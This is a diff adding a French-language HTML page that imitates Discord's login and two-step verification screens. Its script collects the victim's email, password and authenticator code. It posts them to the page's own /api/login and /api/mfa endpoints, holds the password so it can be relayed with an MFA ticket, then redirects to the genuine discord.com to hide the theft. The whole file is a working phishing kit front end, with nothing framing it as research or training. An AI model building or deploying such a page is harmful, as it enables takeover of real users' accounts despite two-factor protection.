@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Discord</title>
+<style>
+  * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; }
+  body { background-color: #313338; color: #dbdee1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+  .login-box { background: #2b2d31; padding: 32px; border-radius: 5px; width: 100%; max-width: 480px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
+  h2 { text-align: center; color: #f2f3f5; margin-bottom: 8px; font-size: 24px; }
+  p.sub { text-align: center; font-size: 16px; color: #b5bac1; margin-bottom: 20px; margin-top: 0; }
+  label { font-size: 12px; font-weight: bold; color: #b5bac1; text-transform: uppercase; margin-bottom: 8px; display: block; }
+  input { width: 100%; padding: 10px; margin-bottom: 20px; background: #1e1f22; border: none; color: #dbdee1; border-radius: 3px; font-size: 16px; outline: none; }
+  input:focus { box-shadow: 0 0 0 2px #5865F2; }
+  button { width: 100%; padding: 12px; background: #5865F2; color: white; border: none; border-radius: 3px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.2s; }
+  button:hover { background: #4752C4; }
+  .link { font-size: 14px; color: #00a8fc; text-decoration: none; display: block; margin-top: 15px; }
+  .link:hover { text-decoration: underline; }
+  .hidden { display: none; }
+</style>
+</head>
+<body>
+  <div class="login-box">
+    <div id="step1">
+      <h2>Bon retour !</h2>
+      <p class="sub">Nous sommes ravis de vous revoir.</p>
+      <form id="loginForm">
+        <label>Adresse e-mail ou numéro de téléphone <span style="color:#f23f43">*</span></label>
+        <input type="text" id="email" required>
+        <label>Mot de passe <span style="color:#f23f43">*</span></label>
+        <input type="password" id="password" required>
+        <a href="#" class="link">Mot de passe oublié ?</a>
+        <button type="submit" style="margin-top: 20px;">Se connecter</button>
+      </form>
+    </div>
+    <div id="step2" class="hidden">
+      <h2>Vérification en deux étapes</h2>
+      <p class="sub">Entrez le code à 6 chiffres généré par votre application d'authentification.</p>
+      <form id="mfaForm">
+        <label>Code d'authentification <span style="color:#f23f43">*</span></label>
+        <input type="text" id="mfaCode" maxlength="6" required>
+        <button type="submit" style="margin-top: 20px;">Valider</button>
+      </form>
+    </div>
+  </div>
+
+<script>
+  let savedEmail = "";
+  let savedPass = "";
+  let mfaTicket = "";
+
+  document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    savedEmail = document.getElementById('email').value;
+    savedPass = document.getElementById('password').value;
+
+    const res = await fetch('/api/login', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({email: savedEmail, password: savedPass})
+    });
+    
+    const data = await res.json();
+    
+    if (data.mfa) {
+      mfaTicket = data.ticket;
+      document.getElementById('step1').classList.add('hidden');
+      document.getElementById('step2').classList.remove('hidden');
+    } else if (data.success) {
+      window.location.href = "https://discord.com/channels/@me";
+    } else {
+      alert("Identifiants incorrects.");
+    }
+  });
+
+  document.getElementById('mfaForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const code = document.getElementById('mfaCode').value;
+
+    const res = await fetch('/api/mfa', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({email: savedEmail, password: savedPass, code: code, ticket: mfaTicket})
+    });
+    
+    const data = await res.json();
+    if (data.success) {
+      window.location.href = "https://discord.com/channels/@me";
+    } else {
+      alert("Code invalide.");
+    }
+  });
+</script>
+</body>
+</html>
